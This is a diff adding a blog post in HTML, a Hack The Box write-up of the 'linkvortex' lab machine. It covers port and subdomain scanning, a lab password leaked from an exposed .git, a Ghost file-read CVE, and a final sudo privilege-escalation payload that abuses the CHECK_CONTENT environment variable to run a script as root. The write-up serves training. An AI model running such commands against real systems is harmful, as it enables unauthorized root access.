@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB - linkvortex | shafouz blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="HTB - linkvortex" />
+<meta name="author" content="shafouz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Linkvortex is a easy difficulty box. We start by discovering a subdomain hosting a Git repository. It gives us a password and the framework running on the main site. We then use a know cve to read a configuration file getting our user shell. For the root shell we abuse a vulnerability in a sudo script." />
+<meta property="og:description" content="Linkvortex is a easy difficulty box. We start by discovering a subdomain hosting a Git repository. It gives us a password and the framework running on the main site. We then use a know cve to read a configuration file getting our user shell. For the root shell we abuse a vulnerability in a sudo script." />
+<link rel="canonical" href="https://shafouz.github.io/2024/12/24/htb-linkvortex.html" />
+<meta property="og:url" content="https://shafouz.github.io/2024/12/24/htb-linkvortex.html" />
+<meta property="og:site_name" content="shafouz blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-12-24T18:47:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB - linkvortex" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"shafouz"},"dateModified":"2024-12-24T18:47:00+00:00","datePublished":"2024-12-24T18:47:00+00:00","description":"Linkvortex is a easy difficulty box. We start by discovering a subdomain hosting a Git repository. It gives us a password and the framework running on the main site. We then use a know cve to read a configuration file getting our user shell. For the root shell we abuse a vulnerability in a sudo script.","headline":"HTB - linkvortex","mainEntityOfPage":{"@type":"WebPage","@id":"https://shafouz.github.io/2024/12/24/htb-linkvortex.html"},"url":"https://shafouz.github.io/2024/12/24/htb-linkvortex.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://shafouz.github.io/feed.xml" title="shafouz blog" />
+<!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-F6L4J94HSJ"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-F6L4J94HSJ');
+  </script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">shafouz blog</a></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB - linkvortex</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-12-24T18:47:00+00:00" itemprop="datePublished">
+        Dec 24, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Linkvortex is a easy difficulty box. We start by discovering a subdomain hosting a Git repository. It gives us a password and the framework running on the main site. We then use a know cve to read a configuration file getting our user shell. For the root shell we abuse a vulnerability in a sudo script.</p>
+
+<h1 id="nmap">nmap</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/workspace/projects/htb/linkvortex » nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 1024 <span class="si">$(</span><span class="nb">cat </span>ip.txt<span class="si">)</span>                      shafou@shafou
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-12-24 13:26 <span class="nt">-04</span>
+Nmap scan report <span class="k">for </span>linkvortex.htb <span class="o">(</span>10.10.11.47<span class="o">)</span>
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>71.36 seconds
+</code></pre></div></div>
+
+<h1 id="subdomain-bruteforce">subdomain bruteforce</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/workspace/projects/htb/linkvortex » ffuf <span class="nt">-u</span> http://<span class="si">$(</span><span class="nb">cat </span>ip.txt<span class="si">)</span> <span class="nt">-H</span> <span class="s1">'Host: FUZZ.linkvortex.htb'</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt <span class="nt">-ac</span>
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.47
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+ :: Header           : Host: FUZZ.linkvortex.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: all
+________________________________________________
+
+[Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 161ms]
+| URL | http://10.10.11.47
+    * FUZZ: dev
+
+[Status: 400, Size: 226, Words: 20, Lines: 9, Duration: 160ms]
+| URL | http://10.10.11.47
+    * FUZZ: #www
+
+[Status: 400, Size: 226, Words: 20, Lines: 9, Duration: 158ms]
+| URL | http://10.10.11.47
+    * FUZZ: #mail
+
+:: Progress: [19966/19966] :: Job [1/1] :: 97 req/sec :: Duration: [0:03:26] :: Errors: 0 ::
+</span></code></pre></div></div>
+
+<h1 id="endpoint-bruteforce">endpoint bruteforce</h1>
+<ul>
+  <li>.git found</li>
+</ul>
+
+<h1 id="password-found-on-git">password found on git</h1>
+<ul>
+  <li>OctopiFociPilfer45</li>
+</ul>
+
+<h1 id="looking-at-ghost-docs">looking at ghost docs</h1>
+<ul>
+  <li>login screen at /ghost/</li>
+  <li>have to deduce the email <code class="language-plaintext highlighter-rouge">admin@linkvortex.htb</code>, more of a convention than a deduction</li>
+</ul>
+
+<h1 id="ghost-version">ghost version</h1>
+<ul>
+  <li>Version: 5.58.0</li>
+  <li>screen shot</li>
+</ul>
+
+<h1 id="vulnerable-to">vulnerable to</h1>
+<ul>
+  <li>CVE-2023-40028 arbitrary file read</li>
+  <li>poc on github</li>
+  <li>by looking at the dockerfile we get the path of the config /var/lib/ghost/config.production.json</li>
+  <li>that has the ssh login password for the bob user</li>
+</ul>
+
+<h1 id="user">user</h1>
+<p><code class="language-plaintext highlighter-rouge">user.txt - 33c3c***************************</code></p>
+
+<h1 id="root">root</h1>
+<p>sudo -l shows a script we can use
+it also has the option <code class="language-plaintext highlighter-rouge">env_keep+=CHECK_CONTENT</code>
+that means sudo will keep CHECK_CONTENT if we set it</p>
+
+<p>the vulnerability on the script is on:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="nv">$CHECK_CONTENT</span><span class="p">;</span><span class="k">then</span>
+</code></pre></div></div>
+<p>whatever we put on $CHECK_CONTENT runs as root.</p>
+
+<p>To reach that we need a symlink that ends with .png and we can’t use spaces because of the check on line 5:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob@linkvortex:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">CHECK_CONTENT</span><span class="o">=</span><span class="s1">'echo 123'</span><span class="p">;</span> <span class="nb">sudo</span> /usr/bin/bash /opt/ghost/clean_symlink.sh bla.png
+/opt/ghost/clean_symlink.sh: line 5: <span class="o">[</span>: <span class="nb">echo</span>: binary operator expected
+</code></pre></div></div>
+
+<p>Final payload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> bla.png ble.png<span class="p">;</span> <span class="nb">echo</span> <span class="s1">'cat /root/root.txt'</span> <span class="o">&gt;</span> a.sh<span class="p">;</span> <span class="nb">chmod</span> +x ./a.sh<span class="p">;</span> <span class="nb">export </span><span class="nv">CHECK_CONTENT</span><span class="o">=</span><span class="s1">'./a.sh'</span><span class="p">;</span> <span class="nb">sudo</span> /usr/bin/bash /opt/ghost/clean_symlink.sh ble.png
+</code></pre></div></div>
+
+<h1 id="root-1">root</h1>
+<p><code class="language-plaintext highlighter-rouge">root.txt - 3d9e9***************************</code></p>
+
+  </div><a class="u-url" href="/2024/12/24/htb-linkvortex.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="https://shafouz.github.io/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">shafouz</li>
+          <li><a class="u-email" href="mailto:jlmacedomatos@gmail.com">contact</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p></p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://hackerone.com/shafou" target="_blank" title="hackerone">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#hackerone"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://github.com/shafouz" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/shafouzzzzzz" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/joao-luca/" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
